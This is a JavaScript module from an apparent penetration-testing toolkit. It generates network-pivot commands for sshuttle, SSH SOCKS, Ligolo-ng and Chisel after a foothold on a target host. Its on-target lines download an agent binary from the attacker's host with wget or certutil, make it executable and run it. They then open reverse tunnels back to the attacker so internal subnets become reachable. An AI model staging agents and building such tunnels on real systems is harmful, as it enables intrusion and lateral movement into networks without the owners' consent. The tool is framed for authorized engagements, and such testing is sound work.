/*!
 * obol engine — pivotkit.js — the Pivot Station (OBOL.pivotkit). Pure, Node-safe, tested.
 *
 * Ports obol-local's TRANSPORT_HALVES: for each tunnel transport, which half runs LOCALLY (on your Kali
 * box) and which runs ON THE TARGET. obol writes BOTH halves, filled from the engagement (your LHOST,
 * the foothold host, the discovered internal subnet, any SSH credential); you run the local .sh and
 * paste the on-host one-liner onto the target. obol never touches the target. Transport is auto-chosen
 * from the facts (an SSH credential -> sshuttle; a foothold plus a stageable agent -> ligolo/chisel) and
 * is overridable. Locate-first: the subnet comes from scan.local.routes/interfaces (paste `ip route`
 * from the foothold into Evidence and it fills). House style: no em or en dashes.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  // Each transport: where each half runs, how to build them, what it needs, and the install hint.
  var TRANSPORTS = [
    {
      id: 'sshuttle', label: 'sshuttle', needs: 'ssh',
      teach: 'A VPN-like tunnel over plain SSH. All local, nothing to stage on the target. The simplest pivot when you have SSH creds.',
      install: 'sudo apt install -y sshuttle',
      local: function (c) { return ['sshuttle -r ' + sshTarget(c) + ' ' + c.subnet + ' -x ' + c.pivotHost + ' --dns']; },
      onhost: function () { return []; },
    },
    {
      id: 'ssh-dynamic', label: 'SSH dynamic (SOCKS)', needs: 'ssh',
      teach: 'An SSH dynamic port-forward (a SOCKS proxy). All local; point proxychains at 127.0.0.1:1080.',
      install: 'ssh is already on Kali; edit /etc/proxychains4.conf to "socks5 127.0.0.1 1080"',
      local: function (c) { return ['ssh -D 1080 -N -f ' + sshTarget(c), '# then: proxychains4 <your tool> <internal-host>']; },
      onhost: function () { return []; },
    },
    {
      id: 'ligolo', label: 'Ligolo-ng', needs: 'agent',
      teach: 'A fast userland tunnel with a real tun interface, so your tools reach the subnet with no proxychains. Stage the agent on the target.',
      install: 'Download ligolo-proxy and the agent from the ligolo-ng releases (or the Loadout stages them).',
      local: function (c) { return [
        'sudo ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null || true',
        'sudo ip link set ligolo up',
        'ligolo-proxy -selfcert -laddr 0.0.0.0:' + c.port + ' &',
        'sleep 2',
        '# in the ligolo console: session -> pick the agent, then: start',
        'sudo ip route add ' + c.subnet + ' dev ligolo',
      ]; },
      onhost: function (c) { return [agentStage(c, 'linux'), './agent -connect ' + c.lhost + ':' + c.port + ' -ignore-cert']; },
      onhostWin: function (c) { return [agentStage(c, 'windows'), 'agent.exe -connect ' + c.lhost + ':' + c.port + ' -ignore-cert']; },
    },
    {
      id: 'chisel', label: 'Chisel', needs: 'agent',
      teach: 'A reliable reverse SOCKS tunnel over HTTP. Server local, client on the target; use proxychains to reach the subnet.',
      install: 'sudo apt install -y chisel  # or download the matching client for the target OS',
      local: function (c) { return [
        'chisel server -p ' + c.port + ' --reverse &',
        'sleep 2',
        '# then point proxychains at 127.0.0.1:1080 (socks5)',
      ]; },
      onhost: function (c) { return [agentStage(c, 'linux', 'chisel'), './chisel client ' + c.lhost + ':' + c.port + ' R:1080:socks']; },
      onhostWin: function (c) { return [agentStage(c, 'windows', 'chisel.exe'), 'chisel.exe client ' + c.lhost + ':' + c.port + ' R:1080:socks']; },
    },
  ];

  function sshTarget(c) { return (c.sshUser || 'user') + '@' + (c.pivotHost || 'TARGET'); }
  // The "get the agent onto the target" line (serve it from your box, pull it on the target).
  function agentStage(c, osName, bin) {
    bin = bin || 'agent';
    var url = 'http://' + (c.lhost || 'LHOST') + ':8000/' + bin;
    if (osName === 'windows') return 'certutil -urlcache -f ' + url + ' ' + bin + '   # serve it: python3 -m http.server 8000';
    return 'wget ' + url + ' -O ' + bin + ' && chmod +x ' + bin + '   # serve it: python3 -m http.server 8000';
  }

  function transports() { return TRANSPORTS.slice(); }
  function transportById(id) { return TRANSPORTS.filter(function (t) { return t.id === id; })[0] || null; }

  // Auto-pick a transport from the facts: an SSH credential path -> sshuttle; else a foothold with a
  // stageable agent -> ligolo (default) or chisel. factKinds is an array of fact kind strings.
  function selectTransport(factKinds) {
    var k = {};
    if (Array.isArray(factKinds)) factKinds.forEach(function (x) { k[x] = 1; });
    else if (factKinds && typeof factKinds === 'object') k = factKinds; // kinds() returns an object-set
    var hasSsh = (k['service.ssh'] || k['ssh.reachable'] || k['port:22']) && (k['credential.available'] || k['credential.validated'] || k['credential.plaintext']);
    if (hasSsh) return 'sshuttle';
    return 'ligolo';
  }

  // ctx the kit fills from: {lhost, pivotHost, sshUser, subnet, port, os}
  function ctxDefaults(ctx) {
    ctx = ctx || {};
    return {
      lhost: ctx.lhost || 'LHOST',
      pivotHost: ctx.pivotHost || 'FOOTHOLD',
      sshUser: ctx.sshUser || 'user',
      subnet: ctx.subnet || '10.10.10.0/24',
      port: String(ctx.port || '11601'),
      os: ctx.os || 'linux',
    };
  }

  // localKit(transportId, ctx) -> the downloadable local-half .sh (install preamble gated behind a
  // visible prompt, the transport's local commands, and a liveness reminder).
  function localKit(transportId, ctx) {
    var t = transportById(transportId) || TRANSPORTS[0];
    var c = ctxDefaults(ctx);
    var L = [];
    L.push('#!/usr/bin/env bash');
    L.push('# obol Pivot Station: the LOCAL half of a ' + t.label + ' tunnel. Run this on your Kali box.');
    L.push('# obol wrote this and the on-host half; you run both. obol never touches the target.');
    L.push('set -u');
    L.push('LHOST="' + c.lhost + '"; PIVOT="' + c.pivotHost + '"; SUBNET="' + c.subnet + '"; PORT="' + c.port + '"');
    L.push('');
    L.push('if ! command -v ' + t.id + ' >/dev/null 2>&1; then');
    L.push('  echo "[!] ' + t.id + ' not found. Install it:"');
    L.push('  echo "    ' + t.install.replace(/"/g, '\\"') + '"');
    L.push('  read -r -p "Install now and continue? [y/N] " a; [ "$a" = y ] || exit 1');
    L.push('fi');
    L.push('echo "[*] ' + t.label + ' local half: LHOST=$LHOST PIVOT=$PIVOT SUBNET=$SUBNET PORT=$PORT"');
    t.local(c).forEach(function (line) { L.push(line); });
    if ((t.onhost(c) || []).length) {
      L.push('echo');
      L.push('echo "[*] Now run the ON-HOST half on the target (also in the Pivot Station):"');
      t.onhost(c).forEach(function (line) { L.push('echo "    ' + line.replace(/"/g, '\\"') + '"'); });
    }
    L.push('echo "[*] Test it: proxychains4 nmap -sT -Pn -p 445 <an-internal-host>   (or ping across the tun)"');
    return L.join('\n') + '\n';
  }

  // onHostLines(transportId, ctx, os) -> the commands to paste on the target (copy chips). Empty for
  // the all-local SSH transports.
  function onHostLines(transportId, ctx, osName) {
    var t = transportById(transportId) || TRANSPORTS[0];
    var c = ctxDefaults(ctx);
    if (osName === 'windows' && t.onhostWin) return t.onhostWin(c);
    return t.onhost ? t.onhost(c) : [];
  }

  OBOL.pivotkit = {
    transports: transports, transportById: transportById, selectTransport: selectTransport,
    localKit: localKit, onHostLines: onHostLines, ctxDefaults: ctxDefaults,
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
